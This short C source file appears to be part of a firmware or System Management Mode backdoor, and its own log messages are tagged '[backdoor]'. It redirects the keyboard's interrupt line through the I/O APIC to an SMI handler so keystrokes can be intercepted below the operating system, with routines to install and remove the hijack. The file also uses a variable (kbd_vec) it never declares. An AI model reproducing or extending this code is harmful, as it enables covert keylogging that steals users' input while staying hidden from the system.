#define CONFIG_X86_32
#include "linux/i8042-io.h"
#include "linux/asm/apicdef.h"

#define HIJACKED_IRQ	0x12//0x2e//0x2c
#define INTERRUPT_VECTOR	0x31//66//0x3e
static int kb_data;

static void hijack_keyboard(void)
{
//    i8042_write_command(0xff);
    kbd_vec = ioapic_read_reg(HIJACKED_IRQ);
    dprintf(3, "[backdoor] vector for IRQ #0x%02x is 0x%02x\n", HIJACKED_IRQ, kbd_vec);
    ioapic_write_reg(HIJACKED_IRQ, APIC_DM_SMI);
    dprintf(3, "[backdoor] hijacking IRQ #0x%02x\n", HIJACKED_IRQ);
}
static void recover_keyboard(void)
{
    ioapic_write_reg(HIJACKED_IRQ, kbd_vec);
    dprintf(3, "[backdoor] remove IRQ #0x%02x hijacking\n", HIJACKED_IRQ);
}

void dump_keyboard(void)
{
    static int is_redirect = 0;
	if (0 == is_redirect) {
	    show_ioredtbl();
        hijack_keyboard();
        is_redirect = 1;
    } else {
        //dprintf(3, "=====> keyboard [0x%02x]data register 0x%02x\n", i8042_read_status(), i8042_read_data());
        dprintf(3, "=====> keyboard\n");
        trigger_self_ipi(0x31);
    }
}
